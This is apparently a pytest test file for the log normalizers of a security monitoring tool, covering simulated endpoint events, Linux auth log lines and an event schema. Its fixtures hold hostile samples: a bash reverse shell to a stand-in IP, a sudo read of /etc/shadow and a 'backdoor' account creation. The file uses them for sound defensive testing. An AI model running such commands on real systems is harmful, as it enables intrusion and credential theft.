"""
tests/test_normalizers.py — Unit tests for parsers/normalizers

Run with:  pytest tests/ -v
"""
import sys, json
sys.path.insert(0, ".")

import pytest
from shared.normalizers import normalize, parse_sim_endpoint, parse_linux_auth
from shared.schema import NormalizedEvent


# ── sim-endpoint parser ───────────────────────────────────────────────────────

class TestSimEndpointParser:

    def test_auth_fail_basic(self):
        raw = {
            "event_type": "auth_fail",
            "host": "workstation-01",
            "user": "alice",
            "src_ip": "10.0.0.5",
            "timestamp": "2024-01-01T00:00:00Z",
        }
        e = parse_sim_endpoint(raw)
        assert e.event_type == "auth_fail"
        assert e.host == "workstation-01"
        assert e.user == "alice"
        assert e.fields["src_ip"] == "10.0.0.5"
        assert e.severity == "low"
        assert e.source == "sim-endpoint"

    def test_auth_success_severity(self):
        raw = {"event_type": "auth_success", "host": "h1", "user": "bob", "src_ip": "10.0.0.1"}
        e = parse_sim_endpoint(raw)
        assert e.severity == "info"

    def test_process_start_fields(self):
        raw = {
            "event_type": "process_start",
            "host": "server-01",
            "user": "root",
            "process_name": "bash",
            "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            "file_path": "/tmp/evil.sh",
        }
        e = parse_sim_endpoint(raw)
        assert e.event_type == "process_start"
        assert e.fields["command_line"] == raw["command_line"]
        assert e.fields["file_path"] == raw["file_path"]
        assert e.severity == "medium"

    def test_dns_suspicious_severity(self):
        raw = {"event_type": "dns_suspicious", "host": "h1", "dns_query": "evil.tk"}
        e = parse_sim_endpoint(raw)
        assert e.severity == "high"

    def test_user_created_severity(self):
        raw = {"event_type": "user_created", "host": "h1", "user": "admin", "new_user": "backdoor"}
        e = parse_sim_endpoint(raw)
        assert e.severity == "high"

    def test_impossible_travel_severity(self):
        raw = {
            "event_type": "impossible_travel",
            "host": "h1",
            "user": "alice",
            "location_a": "New York, US",
            "location_b": "Moscow, RU",
        }
        e = parse_sim_endpoint(raw)
        assert e.severity == "high"
        assert e.event_type == "impossible_travel"

    def test_raw_stored_as_json_string(self):
        raw = {"event_type": "auth_fail", "host": "h1", "user": "x"}
        e = parse_sim_endpoint(raw)
        # raw should be serializable
        parsed = json.loads(e.raw)
        assert parsed["event_type"] == "auth_fail"

    def test_timestamp_assigned_if_missing(self):
        raw = {"event_type": "auth_fail", "host": "h1"}
        e = parse_sim_endpoint(raw)
        assert "T" in e.timestamp  # ISO8601

    def test_explicit_timestamp_preserved(self):
        ts = "2025-06-01T12:00:00Z"
        raw = {"event_type": "auth_fail", "host": "h1", "timestamp": ts}
        e = parse_sim_endpoint(raw)
        assert e.timestamp == ts

    def test_normalize_dispatch(self):
        raw = {"event_type": "auth_fail", "host": "h1", "user": "u"}
        e = normalize("sim-endpoint", raw)
        assert isinstance(e, NormalizedEvent)

    def test_unknown_source_raises(self):
        with pytest.raises(ValueError, match="Unknown source"):
            normalize("unknown-source", {})


# ── linux-auth parser ─────────────────────────────────────────────────────────

class TestLinuxAuthParser:

    def test_ssh_fail(self):
        line = "Mar 17 10:00:00 myhost sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2"
        e = parse_linux_auth(line)
        assert e.event_type == "auth_fail"
        assert e.user == "root"
        assert e.fields["src_ip"] == "192.168.1.100"
        assert e.severity == "low"
        assert e.source == "linux-auth"

    def test_ssh_success(self):
        line = "Mar 17 10:05:00 myhost sshd[1234]: Accepted password for alice from 10.0.0.5 port 22 ssh2"
        e = parse_linux_auth(line)
        assert e.event_type == "auth_success"
        assert e.user == "alice"
        assert e.fields["src_ip"] == "10.0.0.5"
        assert e.severity == "info"

    def test_publickey_success(self):
        line = "Mar 17 10:06:00 host sshd[9]: Accepted publickey for deploy from 10.0.1.1 port 22 ssh2"
        e = parse_linux_auth(line)
        assert e.event_type == "auth_success"
        assert e.user == "deploy"

    def test_new_user_created(self):
        line = "Mar 17 10:07:00 myhost useradd[5678]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash"
        e = parse_linux_auth(line)
        assert e.event_type == "user_created"
        assert e.user == "backdoor"
        assert e.severity == "high"

    def test_sudo_command(self):
        line = "Mar 17 10:08:00 myhost sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"
        e = parse_linux_auth(line)
        assert e.event_type == "process_start"
        assert e.user == "alice"
        assert "/etc/shadow" in e.fields["command_line"]

    def test_dict_input(self):
        line = "Failed password for bob from 1.2.3.4 port 22 ssh2"
        e = parse_linux_auth({"line": line, "host": "custom-host"})
        assert e.host == "custom-host"
        assert e.user == "bob"

    def test_unrecognized_line_raises(self):
        with pytest.raises(ValueError, match="Unrecognized"):
            parse_linux_auth("This is a totally unrelated log line without keywords")

    def test_invalid_user_prefix(self):
        line = "Failed password for invalid user hacker from 5.5.5.5 port 22 ssh2"
        e = parse_linux_auth(line)
        assert e.event_type == "auth_fail"
        assert e.user == "hacker"
        assert e.fields["src_ip"] == "5.5.5.5"


# ── NormalizedEvent schema ────────────────────────────────────────────────────

class TestNormalizedEventSchema:

    def test_to_dict_roundtrip(self):
        e = NormalizedEvent(
            source="sim-endpoint", host="h1", event_type="auth_fail",
            summary="test", raw={"x": 1}, user="alice",
            fields={"src_ip": "1.2.3.4"}
        )
        d = e.to_dict()
        e2 = NormalizedEvent.from_dict(d)
        assert e2.event_id   == e.event_id
        assert e2.source     == "sim-endpoint"
        assert e2.user       == "alice"
        assert e2.fields.get("src_ip") == "1.2.3.4"

    def test_event_id_unique(self):
        e1 = NormalizedEvent(source="s", host="h", event_type="t", summary="s", raw={})
        e2 = NormalizedEvent(source="s", host="h", event_type="t", summary="s", raw={})
        assert e1.event_id != e2.event_id

    def test_default_severity_info(self):
        e = NormalizedEvent(source="s", host="h", event_type="t", summary="s", raw={})
        assert e.severity == "info"

    def test_fields_default_empty_dict(self):
        e = NormalizedEvent(source="s", host="h", event_type="t", summary="s", raw={})
        assert e.fields == {}

    def test_from_dict_string_fields(self):
        d = {
            "event_id": "abc", "timestamp": "2024-01-01T00:00:00Z",
            "source": "sim-endpoint", "host": "h1", "user": None,
            "event_type": "auth_fail", "severity": "low",
            "summary": "test", "raw": "{}",
            "fields": '{"src_ip": "1.2.3.4"}'   # stored as JSON string in DB
        }
        e = NormalizedEvent.from_dict(d)
        assert e.fields["src_ip"] == "1.2.3.4"
